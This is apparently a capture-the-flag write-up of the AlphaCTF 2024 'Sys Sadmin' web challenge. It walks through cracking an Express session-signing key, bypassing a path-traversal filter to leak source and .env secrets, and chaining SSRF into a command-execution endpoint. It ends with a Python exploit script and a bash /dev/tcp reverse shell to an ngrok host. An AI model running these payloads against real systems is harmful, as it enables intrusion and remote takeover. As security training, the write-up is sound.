# Sys Sadmin Writeup

## Challenge:

![challenge](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/challenge.png?raw=true)

## Solution

when trying to access the website we get that:
![first response](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/1.png?raw=true)

### First step (Session cracking)

I tried alot of things to make myself the sysadmin:

- setting the "Authorization" header to sysadmin
- creating a cookie with role sysadmin, user sysadmin
  ... but nothing seem to be working.
  I checked the headers of the response and saw this:

```
{'Server': 'nginx/1.22.1', 'Date': 'Sat, 09 Mar 2024 21:14:43 GMT', 'Content-Type': 'application/json;charset=utf-8', 'Content-Length': '31', 'Connection': 'keep-alive', 'X-Powered-By': 'Express', 'ETag': 'W/"1f-CfeotWUUVqZcjnfks+0G5BphXdc"',
'Set-Cookie': 'session=eyJ1c2VyIjoiZ3Vlc3QifQ==; path=/; httponly,
session.sig=lHUcFqnwsby5LLoCnk8R5pXuZ1A; path=/; httponly'}
```

i saw that 'Set-Cookie' header , decoded the base64 session and got :

```
{
    "user":"guest"
}
```

i tried changing it to sysadmin then encoded it but it didn't work, clearly because the server is correctly checking signature.
until here there was no hint provided and i was 24h without sleep and too tired, that's why i told myself "nah i don't think cracking the cookie is part of the solution"
and went to another challenge :)
then a hint was added, here it is:
![first response](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/2.png?raw=true)

"WHAT A STUPID THOUGHT I HAD!"

thats what i thought after seeing it , clearly it is referring to the cookies.
we know that the server is using express from the returned header, after bit of searching on how to crack express session signatures I found this tool ["cookie-monster"](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express).

cracking the session:

```
cookie-monster.js -c eyJ1c2VyIjoiZ3Vlc3QifQ== -s lHUcFqnwsby5LLoCnk8R5pXuZ1A -w /usr/share/wordlists/rockyou.txt
```

gives us the password "tweetybird"

now sign a new session with the correct creds:

```json
# cookie.json
{
    "user":"sysadmin"
}
```

```bash
cookie-monster -e -f cookie.json -k tweetybird
```

this will give us the new session and session signature:

```
"session":"eyJ1c2VyIjoic3lzYWRtaW4ifQ=="
"session.sig":"dyeH7Et-g9i4HW4gzkpx2N8gUwg"
```

I send a request to the server with this cookies and I'm IN.

### Second part

you think we are done ? we didn't even start yet.
now when accessing the website with our new cookies we get the following page:
![dashboard page](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/3.png?raw=true)

#### Health checker page

When accessing that page we are faced with this form :
![health checker](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/4.png?raw=true)

I checked the source code of the page and found out the endpoint it is sending to , and started testing it with python.
after some testing i figured out the following constraints:

- if you enter a url that doesn't have a '.' on it (like "http://localhost") it will output this message: "URL must start with "http://" or "https://" and contain a dot in the middle."
- the domain name should contain alphabit or alphactf.
- if you pass anything related to localhost (127.0.0.1, localhost.anything ...) you will get this message "You filthy hacker."
- the apikey doesn't matter (until now)

Here i thought there is nothing i can do and went to check the second page (reports)

#### Reports page

here is the page :
![reports page](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/5.png?raw=true)
when accessing one of those reports we get:
![report 1](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/6.png?raw=true)

when I saw the "reportId" parameter in the url I immediatly thought about LFI .
i tried a simple payload `../../../etc/passwd` I got this :
`{"error":"Report etc/passwd not found!"}`

Aha we're getting filtered !
I tried parameter polution to see how it would behave and got this error:
![error 1](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/7.png?raw=true)

from this i concluded two things:

- clearly now the app is replacing `../` on the reportId parameter with nothing to avoid lfi .
- the app is located in the app/ folder

to get around that we can send this payload : `....//`
after replacing the result would be `../`

now let's try it with this payload:
`...//....//....//....//....//etc/passwd`

and bang we got LFI !!
![lfi](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/8.png?raw=true)

let's leak the app source code:
`....//....//....//....//....//app/index.js`

we get this :

```
const express = require('express');
const routes = require('./routes/routes');
const cookieSession = require('cookie-session');
require('dotenv').config();

const app = express();

// Trust only the loopback addresses (127.0.0.1 and ::1)
app.set('trust proxy', ['loopback', 'linklocal', 'uniquelocal']);

app.use(express.static('public'));

app.use(cookieSession({
  name: 'session',
  keys: [process.env.SECRET_KEY]
}));

app.use('/', routes);

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
```

nothing interesting let's get the routes code:
`....//....//....//....//....//app/routes/routes.js`

```
const express = require('express');
const path = require('path');
const router = express.Router();
const fs = require('fs');
const { exec } = require('child_process');
const { isSafeUrl } = require('../Middlewares/isSafeUrl');
const { checkApiKey } = require('../Middlewares/CheckApiKey');
const { isSysAdmin } = require('../Middlewares/authMiddleware');
const { onlyLocalhost } = require('../Middlewares/OnlyLocalhost');
const bodyParser = require('body-parser');
const axios = require('axios');

router.use(bodyParser.urlencoded({ extended: true }));
router.use(bodyParser.json());
const instance = axios.create({ baseURL: process.env.AXIOS_BASE_URL });


router.get('/', isSysAdmin, (req, res) => {
  res.sendFile('dashboard.html', { root: 'public' });
});


router.get('/reports/report', isSysAdmin, (req, res) => {
  let { reportId } = req.query;
  console.log(reportId);
  reportId = reportId.replace(/\.\.\//g, '');


  if (!reportId) {
    res.status(400).json({ error: 'reportId parameter is required.' });
  } else {
    if (reportId.includes('flag')) {
      return res.status(403).send('You didn\'t expect me to give you the flag this easily, did you?\nWork harder!');
    }
    console.log(reportId)
    p = path.join(__dirname, '..', 'reports', reportId)
    console.log(p)
    const filePath = p;

    fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) {
        console.error(`Error reading file: ${err}`);
        res.status(404).json({ error: `Report ${reportId} not found!` });
      } else {
        fs.readFile(path.join(__dirname, '..', 'public', 'report.html'), 'utf8', (htmlErr, htmlData) => {
          if (htmlErr) {
            console.error(`Error reading HTML file: ${htmlErr}`);
            res.status(500).send('Internal Server Error');
          } else {
            console.log(data)
            const styledData = htmlData.replace('<pre id="fileContent"></pre>', `<pre>${data}</pre>`);
            console.log(styledData)
            res.send(styledData);
          }
        });
      }
    });
  }
});


router.get('/reports', isSysAdmin, (req, res) => {
  fs.readdir('./reports/', (err, files) => {
    if (err) {
      res.status(500).send('Internal Server Error');
    } else {
      const reports = files
        .map(file => {
          const reportId = file;
          return `<a href="/reports/report?reportId=${reportId}" class="report-link">Report ${reportId}</a>`;
        })
        .join('');
      res.send(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>SysAdmin</title>
            <link rel="stylesheet" href="/styles.css">
          </head>
          <body>
            <div class="container">
              <h1>Available Reports</h1>
              ${reports}
            </div>
          </body>
          </html>
        `);
    }
  });
});

router.get('/healthchecker', isSysAdmin, (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'healthchecker.html'));
});


router.post('/api/healthchecker', isSysAdmin, isSafeUrl, async (req, res) => {
  const { url } = req.body;
  const header = req.headers.authorization;
  if (!url || url.trim() === '') {
    return res.status(400).json({ error: 'URL parameter is missing or empty.' });
  }


  const headers = {
    'Content-Type': 'application/json',
    'authorization': header
  };
  try {
    instance.defaults.headers.common['Authorization'] = header;
    const response = await instance.get(url, { headers });
    res.status(200).send('server is up');
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch data from the provided URL.', details: error.message });
  }
});


router.get('/api/remote-task-handler',onlyLocalhost, checkApiKey, (req, res) => {
  const command = req.query.command;

  if (command && command.trim() !== '') {
    exec(command, (err, stdout, stderr) => {
      if (err) {
        return res.status(500).json({ error: 'Command execution failed', details: err.message });
      }
      res.status(200).send(stdout);
    });
  } else {
    res.status(400).json({ error: 'Command parameter missing or empty.' });
  }
});

module.exports = router;
```

whoaa that's a lot , let's talk about the most interesting route `/api/remote-task-handler`

```
router.get('/api/remote-task-handler',onlyLocalhost, checkApiKey, (req, res) => {
  const command = req.query.command;

  if (command && command.trim() !== '') {
    exec(command, (err, stdout, stderr) => {
      if (err) {
        return res.status(500).json({ error: 'Command execution failed', details: err.message });
      }
      res.status(200).send(stdout);
    });
  } else {
    res.status(400).json({ error: 'Command parameter missing or empty.' });
  }
});
```

it clearly executes any command sent to it. (RCE)
howerver it must pass some middlewares :

- onlyLocalhost: after leaking the source code of this middlware i found it is checking if the `request.ip` of the request is '127.0.0.1' or '::1' '::ffff:127.0.0.1'. so obviously we can't just make a request to it from our machine
- checkApiKey: this middlware checks if the request authorization apikey sent by the user is equal to the stored apikey .

to bypass the apikey we can easily leak it using `....//....//....//....//....//app/.env`

but bypassing isLocalhost middlwareis a bit tricky.

remember we had another endpoint (healthchecker) that visits the url we send to it ? we can use it to send a request to that endpoint as localhost !

lets check that endpoint code:

```
router.post('/api/healthchecker', isSysAdmin, isSafeUrl, async (req, res) => {
  const { url } = req.body;
  const header = req.headers.authorization;
  if (!url || url.trim() === '') {
    return res.status(400).json({ error: 'URL parameter is missing or empty.' });
  }


  const headers = {
    'Content-Type': 'application/json',
    'authorization': header
  };
  try {
    instance.defaults.headers.common['Authorization'] = header;
    const response = await instance.get(url, { headers });
    res.status(200).send('server is up');
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch data from the provided URL.', details: error.message });
  }
});
```

it just make a request to the url we send to it however
there is this isSafeUrl middlware that we should bypass to make the request .

lets leak it :

```
function isSafeUrl(req, res, next) {
    const url = req.body.url;
    const blacklist = ['localhost', '127', '0'];
    const whitelist = ['alphactf', 'alphabit'];
    const urlRegex = /^(http:\/\/|https:\/\/).*\..*/; // Regex pattern to match URLs with a dot in the middle

    if (!url || url.trim() === '') {
        return res.status(400).send('URL parameter is missing or empty.');
    }

    if (!url.match(urlRegex)) {
        return res.status(400).send('URL must start with "http://" or "https://" and contain a dot in the middle.');
    }

    try {
        const hostname = url.split('//')[1].split('.')[0];

        if (blacklist.some(forbiddenHostname => hostname.includes(forbiddenHostname))) {
            return res.status(400).send('You filthy hacker.');
        }

        if (!whitelist.includes(hostname)) {
            return res.status(400).send(`Only the following hostnames are allowed: ${whitelist.join(', ')}`);
        }

        next();
    } catch (error) {
        res.status(500).send(`Failed to validate the URL.\nDetails: ${error.message}`);
    }
}
```

let's break this down :

- first the url must not be empty
- it should match that regex `/^(http:\/\/|https:\/\/).*\..*/` which claims to guarantee a dot in the middle of the url (not exactly the middle but anywhere in the url)

after these two checks we get the hostname:

`const hostname = url.split('//')[1].split('.')[0]`
which is not exactly getting the hostname but getting subdomain if the url contains one, f.e : ilyes.haddad.com the hostname would be ilyes not haddad.

this hostname is checked if it contains any blacklisted hosts (if so the request is rejected) then checked if it had one of the whitelisted ones (alphabit, alphactf)

if all of this is passed we can have our url fetched.

### Bypassing

Now What do we need to do ?
here is the process for getting RCE :
we will use SSRF (server side request forgery) vulnrability present in `/api/healthchecker` , and send a request with a url that points to `/api/remote-task-handler` with our command in order to execute it and give us the output.
now the real challenge is to craft the url that bypasses the "isSafeUrl" middleware.
as we saw it is only checking the subdomain and not all the hostname.
`const hostname = url.split('//')[1].split('.')[0];`
so our url must contain a subdomain that is alphabit or alphactf and the full url need to point to localhost at port 3000 where the app is running.

at first i was trying to do this using my domainname here is how :
I have a domain name reserved "ilyeshaddad.com" so I added a CNAME record for a subdomain "alphabit.ilyeshaddad.com" that points to localhost.
however when tried that and sent url as http://alphabit.ilyeshaddad.com/api/remote-task-handler?command=reverseshellcommand i got an error saying that 127.0.0.1:80 is not accessible!
my CNAME record was pointing to localhost at the default port which is 80, however i need the port 3000, because i was exhausted the idea of specifying the port manually slipped my mind (making the request to alphabit.ilyeshaddad.com:3000 instead)
anyway after some researches on localhost addresses that accepts subdomains i found this "localtest.me" which resolves to ::1
now the url would be :
http://alphabit.localtest.me:3000/api/remote-task-handler?command=our command
all left to do now is :

- set up a tcp listener on netcat `nc - nlvp 5555`
- make it public using ngrok `ngrok tcp 0.0.0.0:5555`
- get the public ip of the ngrok tunnel using dig `dig [tcp domain provided by ngrok]`
- create the reverse shell command `bash -c "exec bash -i &>/dev/tcp/[ngrok_tcp_ip]/[ngrok_port] <&1"`
- urlencode the command
- send it .
  i sent it using a python script I made:

```
import requests
url = "https://syssadmin.challenge.alphabit.club/api/healthchecker"
headers={
            "Authorization":"Bearer Ax7rWnE5xYp2qAs9Zc4VbGmH3tFnR6uD8iL0oP",
            "content-type":"application/json",
            "X-Forwarded-For":"127.0.0.1"
        }
cookies = {
            "session":"eyJ1c2VyIjoic3lzYWRtaW4ifQ==",
            "session.sig":"dyeH7Et-g9i4HW4gzkpx2N8gUwg"
            }
data = {

    "url":"http://alphabit.localtest.me:3000/api/remote-task-handler?command=bash%20-c%20%22exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F3.125.223.134%2F19253%20%3C%261%22&key.jk=2",

}
r = requests.post(url, cookies=cookies , headers=headers, json=data)
print(r.text)
```

boom you have a reverse shell! navigate to the root and print the flag.

![flag](https://github.com/Ilyeshaddad337/ctfwriteups/blob/e4ed38d63230fd22d4cb40e685566a74c2689352/AlphaCTF_2k_24/web/SysSadmin/9.png?raw=true)
